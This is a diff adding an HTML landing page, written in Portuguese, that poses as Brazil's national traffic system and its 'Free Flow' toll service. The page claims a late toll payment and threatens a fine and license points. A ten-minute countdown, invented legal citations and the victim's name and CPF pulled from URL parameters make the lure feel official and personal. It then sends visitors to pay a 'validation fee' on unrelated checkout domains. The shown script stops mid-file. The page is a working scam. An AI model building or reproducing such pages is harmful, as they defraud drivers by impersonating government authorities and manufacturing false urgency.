@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validação Extemporânea Necessária - Free Flow</title>
+    <meta name="description" content="Validação de sistema necessária para evitar multa e pontos na CNH">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #dc2626;
+            --success: #16a34a;
+            --warning: #f59e0b;
+            --destructive: #dc2626;
+            --muted-foreground: #6b7280;
+            --foreground: #111827;
+            --background: #ffffff;
+            --card: #f9fafb;
+            --border: #e5e7eb;
+            --secondary: #b91c1c;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: var(--background);
+            color: var(--foreground);
+            line-height: 1.5;
+        }
+
+        .min-h-screen {
+            min-height: 100vh;
+        }
+
+        .bg-background {
+            background-color: var(--background);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .px-4 {
+            padding-left: 1rem;
+            padding-right: 1rem;
+        }
+
+        .py-3, .py-2, .py-5, .py-6, .py-10 {
+            padding-top: var(--py, 0.75rem);
+            padding-bottom: var(--py, 0.75rem);
+        }
+
+        .py-5 { --py: 1.25rem; }
+        .py-6 { --py: 1.5rem; }
+        .py-10 { --py: 2.5rem; }
+
+        /* Header */
+        header {
+            border-bottom: 2px solid var(--primary);
+            background-color: var(--primary);
+        }
+
+        .flex {
+            display: flex;
+        }
+
+        .items-center {
+            align-items: center;
+        }
+
+        .justify-between {
+            justify-content: space-between;
+        }
+
+        .gap-3 {
+            gap: 0.75rem;
+        }
+
+        .gap-2 {
+            gap: 0.5rem;
+        }
+
+        .gap-4 {
+            gap: 1rem;
+        }
+
+        .text-white {
+            color: white;
+        }
+
+        .text-white\/80 {
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .text-white\/90 {
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .bg-white {
+            background-color: white;
+        }
+
+        .p-2 {
+            padding: 0.5rem;
+        }
+
+        .rounded {
+            border-radius: 0.375rem;
+        }
+
+        .text-base {
+            font-size: 1rem;
+        }
+
+        .text-lg {
+            font-size: 1.125rem;
+        }
+
+        .font-bold {
+            font-weight: bold;
+        }
+
+        .text-xs {
+            font-size: 0.75rem;
+        }
+
+        .text-sm {
+            font-size: 0.875rem;
+        }
+
+        .tracking-wide {
+            letter-spacing: 0.025em;
+        }
+
+        h1 {
+            font-size: 1.125rem;
+        }
+
+        .icon {
+            width: 1.5rem;
+            height: 1.5rem;
+        }
+
+        /* Sub Header */
+        .bg-secondary {
+            background-color: var(--secondary);
+        }
+
+        .border-b {
+            border-bottom: 1px solid var(--border);
+        }
+
+        .bg-card {
+            background-color: var(--card);
+        }
+
+        /* Badge */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            padding: 0.25rem 0.75rem;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 9999px;
+            font-weight: 500;
+            font-size: 0.75rem;
+            color: white;
+            background-color: transparent;
+        }
+
+        /* Progress Bar */
+        .progress-section {
+            padding: 1.25rem;
+            border-bottom: 1px solid var(--border);
+            background-color: var(--card);
+        }
+
+        .max-w-3xl {
+            max-width: 768px;
+        }
+
+        .mx-auto {
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .mb-3 {
+            margin-bottom: 0.75rem;
+        }
+
+        .mb-4 {
+            margin-bottom: 1rem;
+        }
+
+        .mb-2 {
+            margin-bottom: 0.5rem;
+        }
+
+        .mb-6 {
+            margin-bottom: 1.5rem;
+        }
+
+        .mb-1 {
+            margin-bottom: 0.25rem;
+        }
+
+        .font-semibold {
+            font-weight: 600;
+        }
+
+        .text-primary {
+            color: var(--primary);
+        }
+
+        .text-success {
+            color: var(--success);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 0.5rem;
+            background-color: var(--border);
+            border-radius: 9999px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 90%;
+            background-color: var(--success);
+            border-radius: 9999px;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .step-circle {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 2rem;
+            height: 2rem;
+            border-radius: 9999px;
+            color: white;
+        }
+
+        .step-circle.success {
+            background-color: var(--success);
+        }
+
+        .step-circle.warning {
+            background-color: var(--warning);
+            color: #000;
+        }
+
+        .divider {
+            flex: 1;
+            height: 2px;
+            background-color: var(--border);
+            margin: 0 0.5rem;
+        }
+
+        /* Main Content */
+        main {
+            padding: 1.5rem 1rem;
+        }
+
+        .max-w-2xl {
+            max-width: 42rem;
+            margin: 0 auto;
+        }
+
+        /* Card */
+        .card {
+            border: 1px solid var(--border);
+            border-radius: 0.5rem;
+            background-color: white;
+            overflow: hidden;
+        }
+
+        .card.border-2 {
+            border-width: 2px;
+        }
+
+        .card.destructive {
+            border-color: var(--destructive);
+            background-color: var(--destructive);
+        }
+
+        .card-content {
+            padding: 1.5rem;
+        }
+
+        .card-header {
+            padding: 1.5rem;
+            border-bottom: 1px solid var(--border);
+            background-color: rgba(220, 38, 38, 0.05);
+        }
+
+        .card-footer {
+            padding: 1.5rem;
+            border-top: 1px solid var(--border);
+            background-color: rgba(0, 0, 0, 0.03);
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .card-title {
+            font-size: 1.25rem;
+            font-weight: bold;
+            margin-bottom: 0.25rem;
+        }
+
+        .card-description {
+            font-size: 0.875rem;
+            color: var(--muted-foreground);
+        }
+
+        /* Alert Card */
+        .alert-card {
+            border: 2px solid var(--destructive);
+            background-color: var(--destructive);
+            color: white;
+            text-align: center;
+        }
+
+        .alert-card h2 {
+            font-size: 1.875rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin: 0.5rem 0;
+        }
+
+        .alert-card p {
+            font-size: 0.875rem;
+            margin: 0.5rem 0;
+        }
+
+        /* Alert Box */
+        .alert {
+            border-left: 4px solid var(--destructive);
+            background-color: white;
+            border: 1px solid var(--border);
+            border-radius: 0.5rem;
+            padding: 1rem;
+            display: flex;
+            gap: 0.75rem;
+        }
+
+        .alert-icon {
+            width: 1.25rem;
+            height: 1.25rem;
+            color: var(--destructive);
+            flex-shrink: 0;
+        }
+
+        .alert-content {
+            flex: 1;
+        }
+
+        .info-box {
+            border: 1px solid rgba(220, 38, 38, 0.3);
+            background-color: rgba(220, 38, 38, 0.05);
+            padding: 1rem;
+            border-radius: 0.5rem;
+            display: flex;
+            gap: 0.75rem;
+        }
+
+        .info-icon {
+            width: 1.25rem;
+            height: 1.25rem;
+            color: var(--primary);
+            flex-shrink: 0;
+            margin-top: 0.125rem;
+        }
+
+        /* Buttons */
+        .button {
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: 0.375rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            text-decoration: none;
+            width: 100%;
+            justify-content: center;
+        }
+
+        .button.large {
+            padding: 2.5rem 0;
+            font-size: 1.125rem;
+            height: auto;
+            min-height: 3.5rem;
+        }
+
+        .button.success {
+            background-color: var(--success);
+            color: white;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .button.success:hover {
+            background-color: rgba(22, 163, 74, 0.9);
+            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.15);
+        }
+
+        .button.warning {
+            background: linear-gradient(135deg, #f59e0b, #f97316);
+            color: white;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .button.warning:hover {
+            background: linear-gradient(135deg, #d97706, #ea580c);
+            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .button.link {
+            background-color: transparent;
+            color: var(--muted-foreground);
+            font-size: 0.75rem;
+            padding: 0.5rem;
+            text-decoration: underline;
+            width: auto;
+        }
+
+        .button.link:hover {
+            color: var(--destructive);
+        }
+
+        .text-destructive {
+            color: var(--destructive);
+        }
+
+        .text-foreground {
+            color: var(--foreground);
+        }
+
+        .text-muted-foreground {
+            color: var(--muted-foreground);
+        }
+
+        /* Pricing Card */
+        .price-box {
+            text-align: center;
+            padding: 1.5rem;
+            background-color: rgba(0, 0, 0, 0.02);
+            border-radius: 0.5rem;
+            border: 1px solid var(--border);
+        }
+
+        .original-price {
+            font-size: 0.875rem;
+            text-decoration: line-through;
+            color: var(--muted-foreground);
+            margin-bottom: 0.5rem;
+        }
+
+        .current-price {
+            font-size: 3rem;
+            font-weight: bold;
+            color: var(--success);
+            margin: 0.5rem 0;
+        }
+
+        .price-label {
+            font-size: 0.875rem;
+            color: var(--muted-foreground);
+        }
+
+        .benefits-list {
+            margin-top: 1.5rem;
+            space-y: 1rem;
+        }
+
+        .benefits-list li {
+            list-style: none;
+            display: flex;
+            gap: 0.75rem;
+            margin-bottom: 1rem;
+            align-items: flex-start;
+        }
+
+        .benefits-list .check-circle {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 1.25rem;
+            height: 1.25rem;
+            border-radius: 9999px;
+            background-color: var(--success);
+            color: white;
+            flex-shrink: 0;
+            margin-top: 0.25rem;
+        }
+
+        .benefit-text p {
+            margin: 0;
+        }
+
+        .benefit-text .title {
+            font-weight: 500;
+            color: var(--foreground);
+            font-size: 0.875rem;
+        }
+
+        .benefit-text .description {
+            font-size: 0.75rem;
+            color: var(--muted-foreground);
+            margin-top: 0.25rem;
+        }
+
+        /* Warning Box */
+        .warning-box {
+            background-color: rgba(220, 38, 38, 0.1);
+            border: 1px solid rgba(220, 38, 38, 0.2);
+            border-radius: 0.5rem;
+            padding: 1rem;
+            display: flex;
+            gap: 0.75rem;
+            align-items: flex-start;
+        }
+
+        .warning-icon {
+            width: 1.25rem;
+            height: 1.25rem;
+            color: var(--destructive);
+            flex-shrink: 0;
+            margin-top: 0.125rem;
+        }
+
+        .warning-text {
+            flex: 1;
+        }
+
+        .warning-title {
+            font-weight: bold;
+            color: var(--destructive);
+            margin-bottom: 0.25rem;
+        }
+
+        .warning-description {
+            font-size: 0.875rem;
+            color: var(--foreground);
+        }
+
+        /* Footer */
+        .footer-info {
+            margin-top: 1.5rem;
+            text-align: center;
+        }
+
+        .footer-badges {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            font-size: 0.75rem;
+            color: var(--muted-foreground);
+            margin-bottom: 0.75rem;
+        }
+
+        .badge-item {
+            display: flex;
+            align-items: center;
+            gap: 0.25rem;
+        }
+
+        .badge-item .icon {
+            width: 0.75rem;
+            height: 0.75rem;
+        }
+
+        /* Timer */
+        .timer {
+            font-family: 'Courier New', monospace;
+            font-size: 3rem;
+            font-weight: bold;
+            color: var(--destructive);
+        }
+
+        .timer-label {
+            font-size: 0.75rem;
+            color: var(--muted-foreground);
+            margin-top: 0.25rem;
+        }
+
+        /* Countdown Card */
+        .countdown-card {
+            border: 2px solid var(--destructive);
+            background-color: rgba(220, 38, 38, 0.05);
+            margin-bottom: 1.5rem;
+        }
+
+        .countdown-content {
+            padding: 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .countdown-left {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .countdown-icon-box {
+            background-color: var(--destructive);
+            padding: 0.75rem;
+            border-radius: 9999px;
+            display: flex;
+        }
+
+        .countdown-right {
+            text-align: center;
+        }
+
+        /* Grid */
+        .grid {
+            display: grid;
+        }
+
+        .grid-cols-1 {
+            grid-template-columns: 1fr;
+        }
+
+        .gap-3 {
+            gap: 0.75rem;
+        }
+
+        /* Info Box Grid */
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 0.75rem;
+            margin-top: 0.75rem;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            background-color: rgba(220, 38, 38, 0.1);
+            padding: 0.75rem;
+            border-radius: 0.375rem;
+            border: 1px solid rgba(220, 38, 38, 0.2);
+        }
+
+        .info-item .icon {
+            width: 1rem;
+            height: 1rem;
+            color: var(--destructive);
+            flex-shrink: 0;
+        }
+
+        .info-item span {
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: var(--foreground);
+        }
+
+        /* Hidden on Mobile */
+        @media (max-width: 640px) {
+            .hidden-mobile {
+                display: none;
+            }
+
+            .countdown-content {
+                flex-direction: column;
+            }
+
+            .alert-card h2 {
+                font-size: 1.5rem;
+            }
+
+            .current-price {
+                font-size: 2.5rem;
+            }
+
+            main {
+                padding: 1.5rem 0;
+            }
+        }
+
+        @media (min-width: 641px) {
+            .countdown-content {
+                flex-direction: row;
+                align-items: center;
+                justify-content: space-between;
+            }
+
+            .grid-cols-1 {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .countdown-right {
+                text-align: right;
+            }
+
+            h1 {
+                font-size: 1.125rem;
+            }
+
+            .button {
+                padding: 1rem 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container px-4 py-3">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center gap-3">
+                    <div class="bg-white p-2 rounded">
+                        <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="color: var(--primary);">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m7.524-4.061a9 9 0 10-16.956.942m15.356 2.183a9 9 0 01-15.141 7.519"></path>
+                        </svg>
+                    </div>
+                    <div>
+                        <h1 class="text-base md:text-lg font-bold text-white tracking-wide">SISTEMA NACIONAL DE TRANSITO</h1>
+                        <p class="text-xs text-white/80">Free Flow - Gestao de Debitos Veiculares</p>
+                    </div>
+                </div>
+                <div class="flex items-center gap-2 text-white/90 text-sm hidden-mobile" style="display: none;" id="headerTime">
+                    <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 1rem; height: 1rem;">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                    </svg>
+                    <span class="font-mono" id="currentTime">--:--:--</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Sub Header -->
+    <div class="bg-secondary border-b">
+        <div class="container px-4 py-2">
+            <div class="flex items-center justify-between text-sm">
+                <div class="flex items-center gap-4">
+                    <span class="badge" style="color: white; border-color: rgba(255,255,255,0.3);">
+                        <span style="margin-right: 0.25rem;">📄</span>
+                        Protocolo Ativo
+                    </span>
+                    <span class="text-white/80 hidden-mobile">Sessao iniciada em <span id="headerTime2">--:--:--</span></span>
+                </div>
+                <div class="flex items-center gap-2 text-white/90 text-xs" id="mobileTime" style="display: none;">
+                    <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 0.75rem; height: 0.75rem;">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                    </svg>
+                    <span class="font-mono" id="currentTimeM">--:--:--</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Progress Section -->
+    <div class="progress-section">
+        <div class="container px-4 mx-auto max-w-3xl">
+            <div class="mb-3 flex items-center justify-between text-sm">
+                <span class="font-semibold text-foreground">Progresso da Regularizacao</span>
+                <span class="font-bold text-primary">90% Concluido</span>
+            </div>
+            <div class="progress-bar mb-4">
+                <div class="progress-fill"></div>
+            </div>
+            
+            <div class="flex items-center justify-between gap-2">
+                <div class="step-item">
+                    <div class="step-circle success">✓</div>
+                    <div class="hidden-mobile">
+                        <p class="text-xs font-semibold text-foreground">Etapa 1: Pagamento</p>
+                        <p class="text-xs text-success font-medium">Concluido</p>
+                    </div>
+                </div>
+                
+                <div class="divider"></div>
+                
+                <div class="step-item">
+                    <div class="step-circle warning">⚠</div>
+                    <div class="hidden-mobile">
+                        <p class="text-xs font-semibold text-foreground">Etapa 2: Validacao</p>
+                        <p class="text-xs text-destructive font-semibold">Pendente - Acao Necessaria</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="min-h-screen bg-background">
+        <div class="container px-4 max-w-2xl">
+            
+            <!-- Strong Name Trigger -->
+            <div class="card alert-card mb-6 border-2">
+                <div class="card-content">
+                    <div style="text-align: center; space-y: 0.5rem;">
+                        <div class="flex items-center justify-center gap-2">
+                            <svg style="width: 1.5rem; height: 1.5rem;" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                            </svg>
+                            <span class="text-lg font-bold tracking-wide">ATENCAO</span>
+                            <svg style="width: 1.5rem; height: 1.5rem;" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                            </svg>
+                        </div>
+                        <h2 style="font-size: 1.875rem; font-weight: bold; text-transform: uppercase; margin: 0.5rem 0;">
+                            <span id="customerName">PENDENCIA IDENTIFICADA</span>
+                        </h2>
+                        <p class="text-sm text-white/90 font-medium">
+                            Foi identificada uma pendencia urgente vinculada ao seu CPF
+                        </p>
+                        <p class="text-xs text-white/70 font-mono" id="customerDocDisplay" style="display: none;">
+                            CPF: <span id="customerDocFormatted">-</span>
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Countdown Timer Alert -->
+            <div class="card countdown-card">
+                <div class="card-content countdown-content">
+                    <div class="countdown-left">
+                        <div class="countdown-icon-box">
+                            <svg style="width: 1.5rem; height: 1.5rem; color: white;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                            </svg>
+                        </div>
+                        <div>
+                            <p class="text-sm font-semibold text-foreground">TEMPO RESTANTE PARA REGULARIZAR</p>
+                            <p class="text-xs text-muted-foreground">Apos este prazo, a multa sera aplicada automaticamente</p>
+                        </div>
+                    </div>
+                    <div class="countdown-right">
+                        <span class="timer" id="timerDisplay">10:00</span>
+                        <p class="timer-label">minutos : segundos</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Alert Box -->
+            <div class="card mb-6 border" style="border-left: 4px solid var(--destructive);">
+                <div class="card-content">
+                    <div style="space-y: 0.75rem;">
+                        <div class="flex items-start gap-2" style="margin-bottom: 0.5rem;">
+                            <svg class="alert-icon" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                            </svg>
+                            <div style="flex: 1;">
+                                <div id="customerInfoBox" style="background-color: rgba(220, 38, 38, 0.1); border: 1px solid rgba(220, 38, 38, 0.2); border-radius: 0.375rem; padding: 0.75rem; margin-bottom: 0.5rem; display: none;">
+                                    <p class="text-sm font-semibold text-primary">
+                                        Titular: <span id="customerNameAlert" style="text-transform: uppercase;">-</span>
+                                    </p>
+                                    <p class="text-xs text-muted-foreground" id="customerDocAlert" style="margin-top: 0.25rem; display: none;">
+                                        CPF: <span id="customerDocFormattedAlert">-</span>
+                                    </p>
+                                </div>
+
+                                <h2 class="text-lg md:text-xl font-bold text-destructive">
+                                    PAGAMENTO FORA DO PRAZO DETECTADO
+                                </h2>
+                                <p class="text-sm text-foreground leading-relaxed" style="margin-top: 0.5rem;">
+                                    <span id="namePrefix">Identificamos</span> que o pagamento referente ao seu veiculo foi processado 
+                                    <span class="font-bold">apos a janela de tolerancia do sistema</span>. 
+                                    De acordo com a Resolucao CONTRAN, esta validacao e 
+                                    <span class="font-bold text-destructive">OBRIGATORIA</span> para evitar:
+                                </p>
+
+                                <div class="info-grid" style="margin-top: 0.75rem;">
+                                    <div class="info-item">
+                                        <svg class="icon" fill="currentColor" viewBox="0 0 24 24">
+                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                                        </svg>
+                                        <span>Multa de R$ 195,23</span>
+                                    </div>
+                                    <div class="info-item">
+                                        <svg class="icon" fill="currentColor" viewBox="0 0 24 24">
+                                            <path d="M18.92 6.01C18.72 5.42 18.16 5 17.5 5h-11c-.66 0-1.22.42-1.42 1.01L3 12v8c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-1h12v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-8l-2.08-5.99zM6.5 16c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm11 0c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"></path>
+                                        </svg>
+                                        <span>5 pontos na CNH</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Info Box -->
+            <div class="card mb-6 border" style="border: 1px solid rgba(220, 38, 38, 0.3); background-color: rgba(220, 38, 38, 0.05);">
+                <div class="card-content info-box" style="border: none; background: transparent; padding: 1rem; display: flex; gap: 0.75rem;">
+                    <svg class="info-icon" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M13 9h-2v2h2V9zm0 4h-2v6h2v-6zm6-9H5c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 18H5V4h14v18z"></path>
+                    </svg>
+                    <div class="text-sm text-foreground">
+                        <p class="font-semibold mb-1">Informacao do Sistema - <span id="infoTime">--:--:--</span></p>
+                        <p class="text-muted-foreground">
+                            A validacao extemporanea e o procedimento oficial para regularizar pagamentos 
+                            realizados fora do prazo estabelecido. Sem esta validacao, o sistema enviara 
+                            automaticamente a notificacao de infracao ao DETRAN em ate 10 minutos.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Pricing Card -->
+            <div class="card" style="border: 2px solid rgba(220, 38, 38, 0.2); box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);">
+                <div class="card-header">
+                    <div class="flex items-start justify-between">
+                        <div>
+                            <h3 class="card-title">Protocolo de Validacao Extemporanea</h3>
+                            <p class="card-description">Art. 209-A CTB - Regularizacao de Pagamento</p>
+                        </div>
+                        <span class="badge" style="background-color: var(--success); color: white; border: none;">
+                            Obrigatorio
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-content" style="space-y: 1.5rem;">
+                    <!-- Price -->
+                    <div class="price-box">
+                        <div style="margin-bottom: 0.5rem;">
+                            <span class="original-price">De R$ 195,23</span>
+                        </div>
+                        <div class="flex items-baseline justify-center gap-1">
+                            <span class="text-sm text-muted-foreground">Por apenas</span>
+                        </div>
+                        <div class="flex items-baseline justify-center gap-2" style="margin-top: 0.25rem;">
+                            <span class="current-price">R$ 24,90</span>
+                        </div>
+                        <p class="price-label">Taxa unica de validacao</p>
+                    </div>
+
+                    <!-- Benefits List -->
+                    <div class="mb-6">
+                        <h3 class="font-semibold text-foreground">O que esta incluso na validacao:</h3>
+                        <ul class="benefits-list">
+                            <li>
+                                <div class="check-circle">✓</div>
+                                <div class="benefit-text">
+                                    <p class="title">Cancelamento imediato do envio ao DETRAN</p>
+                                    <p class="description">Protocolo processado em tempo real</p>
+                                </div>
+                            </li>
+                            <li>
+                                <div class="check-circle">✓</div>
+                                <div class="benefit-text">
+                                    <p class="title">Baixa prioritaria no sistema</p>
+                                    <p class="description">Processamento em fila preferencial</p>
+                                </div>
+                            </li>
+                            <li>
+                                <div class="check-circle">✓</div>
+                                <div class="benefit-text">
+                                    <p class="title">Comprovante digital de regularidade</p>
+                                    <p class="description">Documento com validade juridica</p>
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <!-- Warning -->
+                    <div class="warning-box">
+                        <svg class="warning-icon" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                        </svg>
+                        <div class="warning-text">
+                            <p class="warning-title">ATENCAO - VALIDACAO OBRIGATORIA</p>
+                            <p class="warning-description">
+                                Se voce nao realizar a validacao nos proximos 
+                                <span class="font-bold" id="warningTimer">10:00</span>, 
+                                a multa de R$ 195,23 e os 5 pontos serao automaticamente registrados 
+                                no sistema do DETRAN vinculado a sua CNH.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card-footer">
+                    <!-- Main CTA Button -->
+                    <a href="https://checkout.escrtoriobrasil.store/VCCL1O8SCQCV" class="button large success" style="gap: 0.75rem;">
+                        <svg style="width: 1.25rem; height: 1.25rem;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m7.524-4.061a9 9 0 10-16.956.942m15.356 2.183a9 9 0 01-15.141 7.519"></path>
+                        </svg>
+                        REGULARIZAR AGORA
+                    </a>
+
+                    <!-- Payment Button -->
+                    <a href="https://checkout.ecovias.sbs/VCCL1O8SCQ8O" class="button warning" style="gap: 0.75rem; padding: 1rem; font-size: 1rem; min-height: 3rem; margin-bottom: 0.5rem;">
+                        <svg style="width: 1.25rem; height: 1.25rem;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h10M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+                        </svg>
+                        REALIZAR PAGAMENTO DA MULTA
+                    </a>
+
+                    <!-- Decline Link -->
+                    <button type="button" class="button link" style="margin-top: 0.5rem;">
+                        Nao desejo regularizar e assumo o risco da multa e pontos
+                    </button>
+                </div>
+            </div>
+
+            <!-- Footer Info -->
+            <div class="footer-info">
+                <div class="footer-badges">
+                    <div class="badge-item">
+                        <svg class="icon" fill="currentColor" viewBox="0 0 24 24" style="width: 0.75rem; height: 0.75rem;">
+                            <path d="M9 12l2 2 4-4m7.524-4.061a9 9 0 10-16.956.942m15.356 2.183a9 9 0 01-15.141 7.519"></path>
+                        </svg>
+                        <span>Ambiente Seguro</span>
+                    </div>
+                    <div class="badge-item">
+                        <svg class="icon" fill="currentColor" viewBox="0 0 24 24" style="width: 0.75rem; height: 0.75rem;">
+                            <path d="M9 12l2 2 4-4m7.524-4.061a9 9 0 10-16.956.942m15.356 2.183a9 9 0 01-15.141 7.519"></path>
+                        </svg>
+                        <span>Certificado SSL</span>
+                    </div>
+                    <div class="badge-item">
+                        <svg class="icon" fill="currentColor" viewBox="0 0 24 24" style="width: 0.75rem; height: 0.75rem;">
+                            <path d="M13 9h-2v2h2V9zm0 4h-2v6h2v-6zm6-9H5c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 18H5V4h14v18z"></path>
+                        </svg>
+                        <span>Protocolo CONTRAN</span>
+                    </div>
+                </div>
+                <p class="text-xs text-muted-foreground">
+                    Sistema operando em <span id="footerTime">--:--:--</span>
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        let timeRemaining = 600; // 10 minutes in seconds
+
+        function updateTime() {
+            const now = new Date();
+            const timeString = now.toLocaleString('pt-BR', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            document.getElementById('currentTime').textContent = timeString;
+            document.getElementById('currentTimeM').textContent = timeString;
+            document.getElementById('headerTime2').textContent = timeString;
+            document.getElementById('infoTime').textContent = timeString;
+            document.getElementById('footerTime').textContent = timeString;
+        }
+
+        function formatTimeRemaining(seconds) {
+            const mins = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+
+        function updateTimer() {
+            document.getElementById('timerDisplay').textContent = formatTimeRemaining(timeRemaining);
+            document.getElementById('warningTimer').textContent = formatTimeRemaining(timeRemaining);
+        }
+
+        // Get URL parameters
+        function getUrlParameter(name) {
+            const params = new URLSearchParams(window.location.search);
+            return params.get(name) || '';
+        }
+
+        function formatCPF(cpf) {
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+
+        // Initialize
+        updateTime();
+        updateTimer();
+
+        const customerName = getUrlParameter('customer_name');
+        const customerDocument = getUrlParameter('customer_document');
+
+        if (customerName) {
+            document.getElementById('customerName').textContent = customerName.toUpperCase();
+            document.getElementById('customerNameAlert').textContent = customerName.toUpperCase();
+            document.getElementById('namePrefix').textContent = `Sr(a). ${customerName.split(' ')[0]}, identificamos`;
+            document.getElementById('customerInfoBox').style.display = 'block';
+        }
+
+        if (customerDocument) {
+            document.getElementById('customerDocDisplay').style.display = 'block';
+            document.getElementById('customerDocFormatted').textContent = formatCPF(customerDocument);
+            document.getElementById('customerDocAlert').style.display = 'block';
+            document.getElementById('customerDocFormattedAlert').textContent = formatCPF(customerDocument);
+        }
+
+        // Show/hide timer on mobile
